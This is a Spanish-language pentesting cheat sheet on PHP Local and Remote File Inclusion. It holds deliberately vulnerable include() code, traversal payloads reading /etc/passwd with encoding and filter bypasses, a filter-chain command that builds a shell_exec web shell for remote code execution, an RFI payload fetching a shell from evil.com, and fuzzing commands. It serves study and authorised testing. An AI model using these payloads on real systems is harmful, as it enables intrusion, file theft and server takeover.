 El File Inclusion ("inclusión" de archivos) es una vulnerabilidad mayormente encontrada en aplicaciones web desarrolladas con PHP, la cual, debido a una falta de sanitización adecuada permite a los atacantes incluir archivos, dando pie a ataques como RCE, robo de datos o defacement.
```php
  <?php
$page = $_GET['page']; // Esta variable viene dada de un input del usuario
include($page . '.php'); // ¡PELIGRO!
?>
```

Esta vulnerabilidad puede ser confundida a menudo con [[Path Trasversal]] debido a que esta también permite la lectura no autorizada de archivos en el sistema. Path Trasversal se centra en manipular el path del sistema (en el contexto de los directorios) para la lectura, en File Inclusion lo que queremos es **subir** archivos al sistema.

# LFI
Pueden emplearse filtros de `php` para sacar contenido en lenguajes que el navegador interpreta (y por tanto no muestra) para analizarlos. 
```php
php://filter/convert.base64-encode/resource=
```
## Metodología
```http
http://example.com/index.php?page=../../../etc/passwd
```

### Null byte
```http
http://example.com/index.php?page=../../../etc/passwd%00
```

### Double encoding
```http
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

### Filter bypasses
```http
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```




## LFI to RCE
[php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)

1. Se utiliza la herramienta para generar una `chain` que nos de la posibilidad de ejecutar comandos. Esto genera una string larguísima que se ha de pasar como valor al parámetro vulnerable a LFI, por ejemplo: 
	`ejemplo.com/index.php?cmd=whoami&page=<contenido de la chain>
	
```
python3 php_filter_chain_generator.py --chain '<?php echo shell_exec($_GET["cmd"]);?>'
```

2. Si esto ha funcionado y se le pueden pasar comandos al servidor ya tenemos una shell. 
```
`ejemplo.com/index.php?cmd=<código para revshell>&page=<contenido de la chain>
```
# RFI
En lugar de buscar un lugar desde el cual subir archivos para accederlos después, podríamos subir directamente la revshell desde un servidor o incluso nuestra propia máquina (EXTREMADAMENTE RASTREABLE, SOLO CON PERMISO O EN CTFS)
```php
<?php

$templateUrl = $_POST[‘template_url’]; // En este ejemplo el código permite el fetch de archivos externos para customizar un blog 
include($templateUrl); // En caso de tener un servidor malicioso podríamos usar esta URL http://100.000.00.00/revshell.php

?>
```

```http
http://example.com/index.php?page=http://evil.com/shell.txt
```
# Protips
```
wfuzz -t 200 -L --hc 404 -w <Diccionario de parametros> -w <Diccionario de Payloads LFI> -u "http://example.com/file.php?FUZZ=FUZ2Z"
```
Ejemplo de comando para buscar vulnerabilidades LFI mediante fuzzing, harán falta dos diccionarios por los que iterar para parámetros y payloads  

### LFI en parametros de otros archivos
Aunque parezca que no hay LFI en principio fuzzeando valores en algo como `/index.php?page=FUZZ`, podría ser que otros archivos tengan sus propios parámetros vulnerables.
```zsh
ffuf -u "http://ejemplo.com/otroArchivo.php?FUZZ=test" -w dict
```


# Recursos
[Indusface](https://www.indusface.com/learning/file-inclusion-attacks-lfi-rfi/)
[Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
[Bypasses para FI de PATT](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#null-byte)
[DeepHacking](https://deephacking.tech/local-file-inclusion-lfi-web/#proc-self-fd-o-dev-fd)
[xerosec](https://youtu.be/8r1HQVZZ6hU)
[RFI/LFI Payload list](https://github.com/payloadbox/rfi-lfi-payload-list)
[PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator)
[Writeup d1se0 para entender LFI to RCE](https://dise0.gitbook.io/h4cker_b00k/ctf/ctfs/ctf-forbiddenhack-easy)
[Muy buen vídeo](https://youtu.be/1WIVW1d37kz) ^57ce82